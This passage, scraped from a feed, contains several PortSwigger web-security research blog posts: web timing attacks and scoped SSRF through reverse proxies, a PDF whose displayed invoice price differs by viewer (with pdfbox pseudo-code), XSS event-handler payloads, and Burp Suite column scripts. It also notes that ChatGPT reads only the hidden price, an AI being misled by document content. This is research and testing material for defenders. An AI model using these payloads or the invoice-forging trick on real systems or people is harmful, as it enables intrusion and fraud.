ping frame! This harmless sacrificial packet ensures that the operating system coalesces the subsequent header frames.\ndisable TCP_NODELAY\nsend a ping frame for each request with no body:\nsend the headers\nwithhold an empty data frame\nfor each request with a body:\nsend the headers, and the body except the final byte\nwithhold a data frame containing the final byte\nwait for 100ms\nsend a ping frame\nsend the final frames\nWe integrated this improved technique into Burp Suite's built-in single-packet attack as soon as we discovered it, so you might have already benefited from it! I'm currently working with the developer of the open-source implementation h2spacex to get it in there too.\nWith network noise out of the picture, our next target is server noise. Do not underestimate server noise. It stems from numerous sources including load on the target server, other systems it interacts with, other virtual systems running on the same physical hardware, and probably the weather near the datacenter. Server noise is the reason I haven't made any claims about what time-delay you can expect to detect with the enhanced single-packet attack - any such claim is so target-specific it's effectively meaningless.\nTo minimize server noise, take the shortest code path possible, and take full advantage of performance features like caching, object reuse, and connection reuse. Committed attackers may also reduce noise from other users using DoS techniques like CPDoS and resource consumption.\nTo maximize signal, focus on the slow code path and make it even slower by using random inputs to avoid server-side caching, incurring access to slow resources where possible, and multiplying the workload. For example, this request uses multiple headers with a fixed prefix to try to expand the delay caused by a server looking for a header starting with 'X-U':\nGET / HTTP/1.1\nX-Uaa: a\nX-Ubb: a\nX-Ucc: a\n{256}\nModern web technologies like ORMs and GraphQL also are particularly suited for delay-expansion techniques. Remember that a DoS attack is just a really easy timing attack and adapt classic techniques like ReDoS, batching, and recursive XML entities.\nVulnerabilities often lurk out of sight in disused and forgotten features that get overlooked by developers and security testers alike. As such, vulnerability discovery journeys often start with the detection of a hidden parameter, cookie, or HTTP header.\nAt its core, discovering these hidden inputs involves guessing potential parameter names and observing if they change the response. Parameters that don't alter the response may remain undetected, alongside any associated vulnerabilities. For my first bulk timing-attack, I decided to fix this.\nConveniently, I'm the core developer of Param Miner - possibly the first tool for bulk parameter discovery. Param Miner compares responses using attributes like 'word count', 'status' and 'line count'. For this research, I simply added 'response time' as an extra attribute, bumped up the repeat count, and got scanning.\nI could have made Param Miner use the single-packet attack for these measurements, but this would have involved significant refactoring and, when researching unproven concepts, I take every possible shortcut to avoid wasting time, so I didn't bother.\nInstead I just measured the time from the last byte of the request to the first byte of the response, and compared the bottom quartile of the two sets of 30 timing measurements to see if they were distinct (indicating a valid parameter), or overlapped. The bottom quartile is ideal for this comparison because it reflects the measurements with the least noise.\nRunning the time-augmented Param Miner on the test bed of 30,000 live sites yielded a huge number of hidden parameters, including some really weird ones.\nOne highlight was a webserver that took 5ms longer to respond to requests containing the mystery HTTP header \"commonconfig\", unless the header value was valid JSON:\nAnother discovery was on a webserver that refused to respond to any requests - it always reset the connection. This extremely defensive behavior wasn't sufficient to stop my scan discovering that it supported a certain HTTP header, because the header made it take significantly longer to reset the connection! Intriguing, but not terribly useful.\nOne frequent finding was much more practical:\nThis pair of responses tells us two valuable things. First, the site is only including specific parameters like 'id' in the cache key, so it's highly exposed to parameter-based cache poisoning attacks. Second, we know the 'id' parameter is keyed and this configuration is typically done site-wide. This means that using time analysis, Param Miner has detected a parameter that applies to a different page!\nWhen I tried this concept out, I anticipated two problems. First, I expected many of the techniques to fail completely. Second, I suspected that any valid results I encountered would be hidden in a morass of false positives.\nThe biggest challenge came from neither. It's that timing attacks are too powerful. They can detect so much that it's incredibly easy to misunderstand what you've detected. They're incredibly good at detecting 'something', but that something isn't necessarily what you're trying to detect.\nillustrates this perfectly. This parameter detection looks like an RCE at first glance, then turns out to be something completely different (but still useful).\nThis video shows what initially looks like a potential remote code execution vulnerability due to an 'exec' parameter causing a visible response delay. This delay turns out to be an indicator of a WAF doing additional processing on more suspicious requests. We then see that the delay stacks when the parameter is repeated, unless the request body is over a certain size threshold. Ultimately this leads to the discovery of a complete WAF bypass. This bypass discovery was completely unexpected to me, but it's since been found by others and is now implemented in the nowafpls tool. It remains a beautiful demonstration of how timing analysis can reveal insights into the target's control flow.\nThat was one of the easy cases - sometimes you may never fully understand what you've detected. Carry your assumptions lightly and test them from different angles wherever possible.\nTo avoid being misled by false assumptions, I decided to focus on specific parameters that provide a clear security impact without any time-consuming manual investigation and a straightforward way to gather additional corroborating evidence.\nIP address spoofing via HTTP headers fulfilled these requirements perfectly. It's a relatively common misconfiguration and directly enables various exploits including rate-limit bypasses, forged logs, and even access control bypasses in some cases. By placing an IP address in a spoofed front-end header, you're effectively impersonating the front-end. We'll explore front-end impersonation attacks in more depth later.\nConveniently, if you place a domain inside a spoofed header, vulnerable servers will often perform an in-band DNS lookup to resolve it, causing an easily detectable delay. Here's a typical detection:\nThe first response comes back quickly because it doesn't trigger a DNS lookup. The second response triggers a DNS lookup for xyz.example.com, so it's slower, and the third response arrives faster because the DNS response has been cached:\nWe'll revisit DNS caching later. In total, scanning for IP address spoofing revealed:\nThis might leave you wondering about the ~170 vulnerable domains that didn't cause a DNS pingback - were they false positives? Here's one example:\nWhat do you think is happening here?\nHere's a clue - in your login history, the website specified the login IP address and location:\nI think this system was passing the spoofed IP address into a library, which validated the format before passing it to a third-party Geolookup service. Supplying an invalid IP address like 'x.psres.net' caused an exception and stopped the slow IP-lookup from happening:\nSo, we've gained a new technique for parameter discovery, proved timing attacks can work at scale in the wild, and also spotted something significant: inputs that trigger errors can short-cut large code paths and result in significantly faster responses. In other words, timing attacks are exceptionally good at detecting exceptions\nTriggering and spotting exceptions is a foundational part of testing for server-side injection vulnerabilities, from SQLi to OS command injection. This makes timing analysis a perfect match for server-side injection detection.\nI attempted to replicate my success with Param Miner by adding 'time' as a response attribute to Backslash Powered Scanner, but this fell flat. Without the single-packet attack, I could only detect major time differences and these predominantly came from WAFs rather than real vulnerabilities. Also, the tool's complexity made it hard to adapt it to overcome challenges.\nFor my second attempt, I reused some code from Param Miner to build a much simpler test that used the single-packet attack. I issued up to 50 request pairs per probe, and recorded the response order of each pair. If the response order was at least 80% biased towards one payload, I reported it as a valid finding.\nThe first finding was a fully blind SQL injection, detected with a classic payload pair:\nUnfortunately, when I reported this it turned out to be a duplicate. In retrospect, I should have seen this coming - you could easily detect the same vulnerability using the well-known '||sleep(5)||' payload. Advanced timing analysis simply isn't required to detect vulnerabilities where you can inject sleep statements. Likewise, timing isn't great for finding code injection because you can normally find those better by using OAST techniques.\nFor powerful vulnerabilities like command injection, SQLi, and code injection, timing-based detection is only really useful when you've got a WAF or filtering in place that blocks the classic detection techniques. Let's look elsewhere.\nTiming comes into its own when looking for the injection underclass; vulnerabilities that allow manipulation of data structures and formats, but stop shy of full code execution. This includes injection into formats like JSON, XML, CSV, and server-side query parameters and HTTP headers. Many of these bugs are rarely spoken of because they're so hard to detect.\nThey're hard to exploit too, but sometimes you can combine timing information with visible features to gain extra insight into what's happening behind the scenes. For example, I spotted one target where an invalid JSON escape sequence made the response come back 200us (0.2ms) faster:\nWhat do you think is happening server-side?\nThere's a clue in the response formatting - the invalid syntax we injected hasn't altered the formatting in the response. I would expect a JSON formatter to fail when run on invalid syntax, or at least return visibly different output.\nAlso, lengthy inputs got redacted in the response:\nThis feature provides a second clue: when our invalid JSON sequence got redacted, the timing difference disappeared! Taken together, this strongly suggests that the delay is happening due to a component parsing the response being sent to us. My best guess is that it's some kind of error logging system. I was pretty pleased about figuring this out from a 0.2ms time differential but with no clear path to an exploit, I decided to move on.\nMy most prolific probe was for blind server-side parameter pollution. This worked by comparing the response times for reserved URI characters like ? and #, with non-reserved characters like !.\nIn some cases, sending an encoded # made the response come back faster:\nThis could be due to the fragment breaking a server-side path and getting a speedy static response from the back-end, or the application's HTTP client simply refusing to send a HTTP request containing a raw #. Of course, it's crucial not to assume which way around the delay will land - on other targets, the encoded # made the response arrive slower.\nServer-side parameter pollution was the most common type of injection discovery by a huge margin, so I think it's a promising area for further research. For more information on this attack class, check out server-side parameter pollution, and Attacking Secondary Contexts in Web Applications.\nAs we've seen, high-precision timing is great for detecting blind injection bugs but they aren't always easy to exploit. While analyzing these findings I often gained some understanding of what was happening server-side, but stalled short of actual exploitation. Also, timing tends to surface lesser-known attack classes that we're less familiar with exploiting.\nGathering enough information for an exploit based purely on timing evidence is often tricky and time-consuming. Testing each idea on a regular, non-blind vulnerability typically involves a single repeater request, whereas with many of these, you're potentially looking at a 30-second Turbo Intruder attack.\nOne thing that can help here is 'bug doppelgangers' - non-blind variations of the target bug class. Param Miner will report these, and they're great for learning how to interpret and exploit these bugs in a less challenging environment.\nBug doppelgangers form part of a broader, recurrent theme from this research. If you ignore timing, you'll miss out, but if you focus too much on timing, you'll also miss out. For success, use every available information channel.\nThe single biggest breakthrough in this research was when I realized I could use timing to detect a widely overlooked type of SSRF.\nBack in 2017, I researched techniques to exploit misconfigured reverse proxies for SSRF and gain access to internal systems. The most common vulnerability was servers which routed requests to the domain specified in the HTTP Host header. To detect these, I would send them a request with a Host pointing to a domain I controlled:\nGET / HTTP/1.1\nHost: uniq-token.burpcollaborator.net\nIf the target was vulnerable, I would see my request arriving on my site at burpcollaborator.net, forwarded by the vulnerable reverse proxy.\nAfter that I would send internal IPs and hostnames to plunder their internal network. This yielded some spectacular findings, including accidentally hacking a system that my ISP put in place to MITM their customers.\nAlthough successful, this detection technique had a major blind spot - scoped SSRF.\nAfter I published the research, someone from Google asked if I'd found any vulnerabilities in their systems, strongly implying that they had been vulnerable. Shortly later, Ezequiel Pereira posted $10k host header in which he exploited an open proxy belonging to Google that I'd failed to detect. My scanning method had failed because Google's proxy was configured to only route requests to their own systems, so my server never received a DNS lookup.\nThis was a hint at a really common scenario, where companies allow request forwarding to arbitrary subdomains:\nI don't think there's an established name for this type of SSRF, so I'll call it scoped SSRF. This restriction can be implemented via an internal DNS server, simple hostname validation, a firewall blocking outbound DNS, or a tight listener config. The outcome is always the same - you've got a bug with an impact close to full SSRF, but it can't be detected using pingback/OAST techniques.\nTo detect scoped SSRF, we need to answer the question \"Did the server try to connect to the specified hostname?\". Timing is perfectly suited for this. Consider a server at www.example.com that issues the following responses:\nThese two responses show that it's doing some kind of validation on the Host header, but there isn't sufficient information to tell if it's an open proxy. If you rely on the response content, you'll end up with both false positives and false negatives.\nThe following request pair is what proves the issue - the faster second response is evidence of DNS caching:\nSome DNS systems don't cache failed DNS lookups, but I found an alternative solution for this - sending an overlong 64-octet DNS label, leading to the DNS client refusing to issue the lookup and a faster response:\nScanning with these techniques revealed hundreds of vulnerable reverse proxies, exposing alternative routes to tens of thousands of domains - I desperately needed automation.\nWhen you find an open reverse proxy, the first step is to try using it to access every possible destination. I wrote code to automatically compile a list of target subdomains using three main sources:\nI made Param Miner try to access each host twice - once directly and once through the proxy - and report any hosts where the two access attempts triggered significantly different responses. When comparing responses, I focused on response status code, header names, and the Location header as these were the highest-signal areas. This yielded numerous findings, which fell into four broad categories.\nGuessing hostnames directly in the Host header is often referred to as 'vhost bruteforcing', but reverse-proxy exploitation often looks completely different, so it's important to understand the distinction. Virtual-host bruteforcing only provides access to other websites on the same server. Meanwhile, reverse proxies will route requests to different systems, enabling unique attacks like front-end rule bypass, front-end impersonation, and exploit chaining opportunities. Let's dive in.\nThe simplest exploit is where you can see the target from outside but can't directly access it.\nOn one company, sonarqube.redacted.com resolved to a public IP address, but attempting to access it triggered a connection reset from a firewall. My probes had identified app.redacted.com as a reverse proxy and, using that, I was able to route around the firewall and access the internal SonarQube instance.\nThere's a common variation where the internal system doesn't have a convenient public DNS record to let you know it exists:\nThere are a huge number of pre-prod, staging, and development servers exposed to anyone applying this technique. If you get lucky, they'll have debugging enabled or test credentials configured, making them soft targets. These systems may even have real target data, or reused keys from production.\nThe most interesting targets I found were pre-launch systems still under active development. In particular, I discovered an admin console with apparently-public access on a really cool US government system, which I'm gutted I can't provide any details about. I reported the issue and the system went 'live' a few months later, but the admin console is nowhere in sight.\nSome targets are publicly accessible, but sit behind front-end servers that enforce inconvenient security rules that block attacks or restrict access to valuable endpoints. The classic way to handle these is by talking directly to the back-end, but that's often impossible due to firewalls.\nReverse proxies provide a compelling alternative - go around the barrier:\nOn one target, using an alternative route via a reverse proxy turned this:\nInto this:\nThe most spectacular and surprising exploits happen when there's a trust relationship between the front-end and back-end. It's common knowledge that you can use headers like X-Forwarded-For to spoof your IP address. What's less appreciated is that this is part of a much broader and more powerful bug class. This type of attack has no established name, so I'll call it a front-end impersonation attack.\nFront-end systems often add HTTP headers onto requests before forwarding them to the back-end. These contain additional information that the back-end might find useful, such as the user's remote IP address, and the originating protocol. More complex deployments sometimes use custom headers to transmit critical authentication information. Back-end servers trust these headers implicitly.\nIf an attacker attempts to spoof these headers, the front-end will typically overwrite them. This header overwriting behavior is the single brittle line of defense against front-end impersonation attacks.\nThe easiest way to bypass this defense is to simply talk directly with the back-end, but this is usually impossible due to network firewalls. Another approach is HTTP request tunneling, which I used to completely compromise New Relic's core internal API using a header called \"Service-Gateway-Is-Newrelic-Admin\". You can also try obfuscating headers to smuggle them past the front-end.\nMisconfigured proxies offer an elegant alternative way to bypass header-overwriting defenses and perform front-end impersonation attacks. To try this out,\nApplying this successfully requires a robust mental visualization of what's happening behind the scenes. To help out, I've made a little CTF at listentothewhispers.net - see if you can crack it!\nFinally, scoped SSRF via reverse proxies offers some great exploit chaining opportunities.\nIf you're able to take over a subdomain on the target company and point the DNS record to an arbitrary IP address, you can use this to upgrade a scoped SSRF into a full SSRF and hit arbitrary IP addresses. This is a lot like chaining a traditional SSRF with an open redirect.\nSince reverse proxies let you pick your back-end, they're great for HTTP request smuggling. I didn't have time to properly explore this concept. In short, I think you'll find that, while it should be easy to find back-ends that are vulnerable to request smuggling, cross-user exploitation will often be impossible because no legitimate users will be sharing your front-end/back-end connection. To prove the impact, you'll need to pursue tunneling-based exploits like front-end impersonation and header disclosure.\nMy goal for this research is to get people using timing attacks day to day. As such, I plan to spend the next month improving the tooling in Param Miner and Turbo Intruder. In particular, I think it's possible to make most timing attacks quite a bit faster simply by using the t-test to decide whether to report a discovery, bail, or get more samples. I'll also be looking out for user feedback - if you have any requests or thoughts, let me know via Github or send me an email.\nThese findings have just scratched the surface, and timing attacks still have massive potential for further research. If you're interested to see where this attack class might go next, or pushing it further yourself, there are many different avenues to consider.\nI think the single most valuable area is looking for new applications of timing attacks. This is relatively easy, and doesn't require a major time commitment just to get started. The main hazard here is accidentally pursuing a concept where the signal you need to detect is drowned out by noise. Fortunately, this is easy to avoid. Start by thinking about the cause of the delay. Does it come from an extra interaction with a remote system, LAN system, hard disk, RAM, or CPU register? Once you're working at the right level, consider building a local benchmark to measure the signal size that you'll need to detect.\nIf the signal is too small, explore amplification techniques. Remember that most DoS attacks are really just timing attacks, and embrace them. Maybe you can expand the delay using nested XML entities, ReDoS, or hashtable collisions.\nJitter-reduction techniques are incredibly valuable and widely overlooked too - there may be some great techniques waiting for someone to research this area.\nThere's also scope for universal, technique-level improvements. Maybe the single-packet attack works better if you fragment at the TCP layer. Perhaps it's more effective to send ten requests in a single packet instead of two?\nFinally, whichever path you take, try to resist the lure of hyper-focus on a single target - generic and reusable techniques contribute far more to the development of the field.\nTiming attacks are hard to defend against. First and foremost, developers should understand that attacker visibility into their system's inner workings goes beyond the actual response content.\nIt's safest to over-estimate attackers' capabilities. Assume an attacker can read every line of code that gets executed. This is similar to your code being open-source, but slightly more serious because live data will affect the execution flow. Attackers can't directly access variables, but they can see which branches get taken and how many iterations each loop goes through.\nIt's especially important to take this into account when implementing performance optimisations such as caching as these tend to provide a massive signal. To mitigate attacks that exploit smaller signals, you could try breaking the single-packet attack by implementing a rate limit restricting each IP address to one request per 1-5 ms.\nLikewise if you're a WAF vendor, consider detecting when a single packet contains multiple HTTP requests and breaking them down into separate packets with a tiny delay between each.\nFinally, yes I do recommend using constant-time functions when comparing user input with secret keys. Just ask anyone who says this is an actual threat to provide a proof of concept.\nIt's not just about the exploits. At their core, web timing attacks are about answering difficult questions.\nWith the single-packet attack, web timing attacks have become 'local', portable, and feasible.\nTiming oracles are everywhere. Whatever you're testing, timing murmurs are always present, waiting for you to listen.\nEnjoy!", "timestamp": "2025-10-21T13:33:19.803357"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Fickle PDFs: exploiting browser rendering discrepancies", "url": "https://portswigger.net/research/fickle-pdfs-exploiting-browser-rendering-discrepancies", "published": "Tue, 09 Jul 2024 12:51:22 GMT", "content": "Published: 09 July 2024 at 12:51 UTC\nUpdated: 15 July 2024 at 09:02 UTC\nImagine the CEO of a random company receives an email containing a PDF invoice file. In Safari and MacOS Preview, the total price displayed is £399. After approval, the invoice is sent to the accounting department, which operates on Windows OS. However, when the same PDF file is opened in Google Chrome or Google Drive, the price changes to £999.\nIn this article, we will show you how to create a hybrid PDF that abuses widget annotations to create render discrepancies, and share the code so you can generate your own.\nThis research was inspired by Konstantin Weddige's blog post \"Kobold Letters\".\nEach major browser has its own method for rendering PDF files. Google Chrome uses an integrated PDF viewer called PDFium, while Safari employs its own PDF rendering engine and Firefox uses PDF.js. Thanks to PDF rendering discrepancies, the same PDF file can appear differently across various browsers. For instance, the appearance of interactive form fields varies between browsers. Google Chrome, with its comprehensive support for both interactive form fields and widget annotations, dynamically updates the displayed text from the annotation value to the form field's default value upon user interaction. However, both Firefox and Google Drive preview prioritize the widget annotation, ignoring the default value entirely. In contrast, Safari's PDF rendering engine completely bypasses the widget annotation, displaying only the default value.\nTo build a proof of concept, we'll use the org.apache.pdfbox Java library. Note that the same result can be achieved even with manual file modification. Our interactive form should have at least one input text field and an annotation for it. The plain text value of this field can be any string, such as £399. This value will be shown in PDF readers that do not support forms, such as Safari and MacOS Preview.\nInterestingly, the org.apache.pdfbox.pdmodel.interactive.form.PDTextField#setValue method also tries to update the visual appearance, unless PDAcroForm.getNeedAppearances() is true. However, we won't use the default appearance; instead, we will render our own using widget annotations.These are objects added to a PDF document to provide additional information or interactive elements without altering the original content. A widget annotation represents the appearance of form fields in an interactive PDF form. It will display the text £999 instead. The pseudo code might look like this:\nPDDocument document = new PDDocument();\nPDAcroForm acroForm = new PDAcroForm(document);\nPDTextField field = new PDTextField(acroForm);\nfield.setValue(\"£399\");\n// Create and set custom appearance stream\nPDFormXObject appearanceStream = new PDFormXObject(document);\n...\nappearanceContents.showText(\"£999\");\nNote the annotations can contain any text and theoretically, nothing prevents you from overwriting the entire page. The full text can be found at https://github.com/PortSwigger/research-labs/tree/main/pdf-rendering-discrepancies\nSafari renders the PDF:\nGoogle Chrome and Drive preview render the different total price:\nFirefox agrees with Google Chrome:\nInterestingly, ChatGPT doesn't support annotations. If you ask it to analyse the invoice, it will return the following:\nThe PDF file is an invoice for Carlos Montoya with the following details:\nInvoice Number: 1\nDate Issued: 01/01/2001\nDate Due: 01/01/3001\nItems:\nItem: L33T Leather Jacket\nQuantity: 1\nUnit Price: £399\nTotal: £399\nThe PDF files rendering process is complex and ambiguous. Be cautious when sending a file to the accounting department for payment or granting a chat assistant access to the mailbox. You can find the Fickle pdf file on Github.", "timestamp": "2025-10-21T13:33:20.870638"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "A hacking hat-trick: previewing three PortSwigger Research publications coming to DEF CON &amp; Black Hat USA", "url": "https://portswigger.net/research/a-hacking-hat-trick-previewing-three-portswigger-research-publications-coming-to-def-con-amp-black-hat-usa", "published": "Tue, 02 Jul 2024 12:57:08 GMT", "content": "Published: 02 July 2024 at 12:57 UTC\nUpdated: 03 September 2025 at 07:38 UTC\nWe're delighted to announce three major research releases from PortSwigger Research will be published at both Black Hat USA and DEF CON 32. In this post, we'll offer a quick teaser of each talk, info on accompanying tools and labs, and suggested pre-reading to get the most out of them.\nIf you won't be there, we've still got you covered - every talk will be accompanied by a whitepaper published to /research within a few days of release, and talk recordings from DEF CON typically land on YouTube in September. Follow us on X, LinkedIn, RSS, or r/websecurityresearch to get notified as soon as they're available.\nAuthor: James Kettle\nBlack Hat: 7th August, 10:20\nDEF CON: 9th August, 11:30\nWebsites are riddled with timing oracles eager to divulge their innermost secrets. It's time we started listening to them.\nIn this session, I'll unleash novel attack concepts to coax out server secrets, including masked misconfigurations, blind data-structure injection, hidden routes to forbidden areas, and a vast expanse of invisible attack-surface.\nThis is not a theoretical threat; every technique will be illustrated with multiple real-world case studies on diverse targets. Unprecedented advances have made these attacks both accurate and efficient; in the space of ten seconds, you can now reliably detect a sub-millisecond differential with no prior configuration or 'lab conditions' required. In other words, I'm going to share timing attacks you can actually use.\nTo help, I'll equip you with a suite of battle-tested open-source tools enabling both hands-free automated exploitation, and custom attack scripting. I'll also share a little CTF to help you hone your new skillset.\nWant to take things further? I'll help you transform your own attack ideas from theory to reality, by sharing a methodology refined through testing countless concepts on thousands of websites. We've neglected this omnipresent and incredibly powerful side-channel for too long.\nSuggested pre-reading:\nTimeless timing attacks\nSmashing the state machine\nAuthor: Gareth Heyes\nBlack Hat: 7th August, 13:30\nDEF CON: 11th August, 10:00\nWebsites often parse users' email addresses to identify their organisation. Unfortunately, parsing emails is far from straightforward thanks to a collection of ancient RFCs that everyone knows are crazy. You can probably see where this is going...\nIn this session, I'll introduce techniques for crafting RFC-compliant email addresses that bypass virtually all defences leading to broken assumptions, parser discrepancies and emails being routed to wildly unexpected destinations. I'll show you how to exploit multiple applications and libraries to spoof email domains, access internal systems protected by 'Zero Trust', and bypass employee-only registration barriers.\nThen I'll introduce another class of attack - harmless-looking input transformed into malicious payloads by unwitting libraries, leading to yet more misrouted emails, and blind CSS injection on a well-known target.\nI'll leave you with a full methodology and toolkit to identify and exploit your own targets, plus a CTF to develop your new skillset.\nSuggested pre-reading:\nBeyond the @ symbol\nEmail domain-validation bypass\nBlind CSS exfiltration\nAuthor: Martin Doyhenard\nBlack Hat: 8th August. 10:20\nDEF CON: 10th August, 10:30\nIn recent years, web cache attacks have become a popular way to steal sensitive data, deface websites, and deliver exploits. We've also seen parser inconsistencies causing critical vulnerabilities like SSRF and HTTP Request Smuggling. This raises the question: what happens if we target web caches' URL-parsers?\nIn this session, I'll introduce two powerful new techniques that exploit RFC ambiguities to bypass the limitations of web cache deception and poisoning attacks and inflict some serious damage.\nFirst, I'll introduce Static Path Deception, a novel technique to completely compromise the confidentiality of an application. I'll illustrate this with a case study showing how such a breach can be replicated in environments like Nginx behind Cloudflare and Apache behind CloudFront, using just their default configurations.\nNext, I'll present Cache Key Confusion, and show how to exploit URL parsing inconsistencies in major platforms, including Microsoft Azure Cloud. I'll then show how to achieve arbitrary cache poisoning and full denial of service in OpenAI and countless platforms.\nFinally, I'll reveal how to supercharge these vulnerabilities with a live demo that blends Cache Key Confusion with a \"non-exploitable\" open redirect. By modifying the response of a static javascript file, I'll show how to execute arbitrary JS code cross-domain. Attendees will depart armed with a set of innovative techniques for uncovering concealed bugs, along with a definitive methodology to find and exploit these and other URL or HTTP discrepancies. To facilitate this, I'll provide an open-source tool to detect all discussed vulnerabilities, plus a lab to level-up your cache exploitation skills!\nSuggested pre-reading:\nWeb cache poisoning\nWeb cache deception\nCached and confused\nYes!\nListen to the whispers will be accompanied by a hosted CTF.\nSplitting the email atom will come with a Web Security Academy lab.\nGotta cache em all will come with an entire Web Security Academy topic on Web Cache Deception!\nPresenters: James Kettle, Natalie Silvanovich, Stefano Zanero\nBlack Hat: 8th August. 11:20\nHave you always wanted to share your security knowledge at conferences like Black Hat, but aren't sure where to begin? Creating a compelling submission starts with the content itself. This panel explores how to select targets for research, based on your own expertise and interests. Learn how to turn an idea into a conference-worthy talk!\nIf you'd like to meet the team and chat research, we'll also be holding a meet & greet in the newly formed Bug Bounty Village at DEF CON:\nMeet the minds behind a decade of acclaimed web security research. Whether you'd like to query our thoughts on technical matters or career decisions, share something cool you've found, flood us with Burp Suite feature requests, or simply say hi, this is your chance! We're also giving three presentations at DEF CON so if you'd like to treat this as an extended Q&A for those, that's cool too. Please note this session may be chaotic.\nAlso if you see us around, do say hi - we have some extremely exclusive swag to give out.\nFinally, there's one more exciting thing coming that we aren't quite ready to announce yet.\nWe'd better get back to our slides now. Hope to see you there!", "timestamp": "2025-10-21T13:33:21.720312"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "onwebkitplaybacktargetavailabilitychanged?! New exotic events in the XSS cheat sheet", "url": "https://portswigger.net/research/new-exotic-events-in-the-xss-cheat-sheet", "published": "Tue, 11 Jun 2024 14:58:29 GMT", "content": "Published: 11 June 2024 at 14:58 UTC\nUpdated: 11 June 2024 at 14:58 UTC\nThe power of our XSS cheat sheet is we get fantastic contributions from the web security community and this update is no exception. We had valuable contributions from Mozilla to remove events that no longer work with the marquee tag on Firefox.\nThere was a wonderfully obscure Safari only vector that used the event onwebkitplaybacktargetavailabilitychanged from @amirmsafari that works on audio and video tags:\nWe had a submission from @Wcraft-log with the onpointercancel event that requires heavy user interaction:\n<xss onpointercancel=alert(1)>XSS</xss>\n@Filipnyquist pointed out that we didn't document that pretty much every element can now use the autofocus attribute. This was discovered earlier by @RenwaX23 and @lbherrera_ .\n<xss onfocus=alert(1) autofocus tabindex=1>\nFinally we had a submission from @zhenwarx that showed there are a bunch of webkit events we missed that require user interaction with the trackpad.\n<xss onwebkitmouseforceup=alert(1)>XSS</xss>\n<xss onwebkitmouseforcewillbegin=alert(1)>XSS</xss>\n<xss onwebkitmouseforceup=alert(1)>XSS</xss>\n<xss onwebkitmouseforcedown=alert(1)>XSS</xss>\n<xss onwebkitmouseforcechanged=alert(1)>XSS</xss>\nBig thanks to the web security community for keeping the XSS cheat sheet up to date with the latest XSS vectors. If you would like to contribute please raise an issue or a PR .\nNote: If you are wondering what we use to generate code snippet images. We use the excellent online tool Ray.so .", "timestamp": "2025-10-21T13:33:22.719864"}
{"source": "blog", "feed": "https://portswigger.net/research/rss", "title": "Refining your HTTP perspective, with bambdas", "url": "https://portswigger.net/research/adjusting-your-http-perspective-with-bambdas", "published": "Wed, 29 May 2024 13:31:49 GMT", "content": "Published: 29 May 2024 at 13:31 UTC\nUpdated: 29 May 2024 at 15:03 UTC\nWhen you open a HTTP request or response, what do you instinctively look for? Suspicious parameter names? CORS headers? Some clue as to the request's origin or underlying purpose?\nA single HTTP message can tell a different story to every viewer, but modern websites send thousands so it's all too easy to overlook something critical. To help, Burp Suite recently added support for custom columns which let you personalize which elements of HTTP requests get surfaced in tables. Here's a simple example which parses the GraphQL operation out of the request body and into a column:\nBehind the scenes, these are crafted using code-snippets called bambdas. This feature is almost paralyzingly powerful, so we thought we'd share some of the columns our research team has created. These range from simple but useful to not so simple. Readers already familiar with Java may notice that we haven't bothered avoiding null pointer exceptions - that's because they're handled for us at the row-level, and therefore don't tend to cause issues.\nUnderstanding the flow of HTTP request sequences is crucial to finding many advanced vulnerabilities, and this makes it slightly easier.\nreturn requestResponse.request().headerValue(\"Referer\");\nPerhaps I have an WAF bypass or a cache poisoning attack that targets a specific proxy.\nreturn requestResponse.response().headerValue(\"Server\");\nShould I prioritise request smuggling, or race conditions? How long will my 10,000-word directory bruteforce take?\nreturn requestResponse.request().httpVersion();\nMaybe I should target their infrastructure instead. Reverse DNS is a wonderful thing.\nString ipAddress = requestResponse.httpService().ipAddress();\nreturn java.net.InetAddress.getByName(ipAddress).getCanonicalHostName();\nYou wouldn't want to accidentally target something out of scope\nreturn requestResponse.request().isInScope();\nYou can usually tell a request's operation at a glance by looking at the URL, but GraphQL is an inconvenient exception. This script fixes that.\nString paramName = \"operationName\";\nif(requestResponse.request().hasParameter(paramName, HttpParameterType.JSON)) {\nreturn requestResponse.request().parameterValue(paramName, HttpParameterType.JSON);\n}\nString query = requestResponse.request().parameterValue(\"query\", HttpParameterType.JSON);\nif(query.contains(\"{\") || query.contains(\"(\")) {\nvar queryParts = query.split(\"\\\\{|\\\\(\");\nreturn queryParts[0];\n}\nreturn \"\";\nEncoded, signed tokens like JWT are everywhere, and always worth peering into. This script will need to be customised to your target.\nif (!requestResponse.hasResponse()) {\nreturn \"\";\n}\nvar extract = \"session\";\nvar response = requestResponse.response();\nvar optionalCookie = response.cookies().stream().filter(cookie -> cookie.name().equals(extract)).findFirst();\nif(optionalCookie.isEmpty()) return \"\";\nvar value = optionalCookie.get().value();\nvar parts = value.split(\"\\\\.\");\nif(parts.length != 3) return \"\";\nvar payload = parts[1];\nreturn utilities().base64Utils().decode(payload, Base64DecodingOptions.URL);\nWhen plotting a CSRF or XSS attack, it's useful to know if any cookies have SameSite disabled.\nif(requestResponse.response() == null) {\nreturn \"\";\n}\nif(!requestResponse.response().hasHeader(\"Set-Cookie\")){\nreturn \"\";\n}\nArrayList<String> cookieNames = new ArrayList<>();\nPattern pattern = Pattern.compile(\"^ ([^=]+).+; SameSite=None\", Pattern.CASE_INSENSITIVE);\nList<HttpHeader> headers = requestResponse.response().headers();\nfor(HttpHeader header : headers) {\nMatcher matcher = pattern.matcher(header.value());\nwhile(matcher.find()) {\ncookieNames.add(matcher.group(1));\n}\n}\nreturn String.join(\", \", cookieNames);\nThis custom column Bamda allows you to prioritise testing of vulnerable endpoints that have deployed unsafe CSP directives such as unsafe-inline or unsafe-eval.\nif(requestResponse.response() == null) {\nreturn \"\";\n}\nif(!requestResponse.response().hasHeader(\"Content-Security-Policy\")) {\nreturn \"No CSP\";\n}\nString csp = requestResponse.response().headerValue(\"Content-Security-Policy\");\nArrayList<String> vulnerableDirectives = new ArrayList<>();\nString[] directivesToCheck = new String[]{\"unsafe-inline\", \"unsafe-eval\"};\nfor(int i=0;i<directivesToCheck.length;i++) {\nif(csp.contains(directivesToCheck[i])) {\nvulnerableDirectives.add(directivesToCheck[i]);\n}\n}\nreturn String.join(\", \", vulnerableDirectives);\nYou can sort an entire table via a custom column, which can help prioritise which requests to target. Over time, I think I'll personally end up writing a giant bambda which scores how hackable a request is from 0-100 but for now, here's two simple examples:\nSometimes, you just want to find the biggest attack surface as quickly as possible.\nreturn requestResponse.request().parameters().size();\nThis can indicate an environment variable leak, or be adapted to find various other interesting strings.\nif (!requestResponse.hasResponse()) {\nreturn 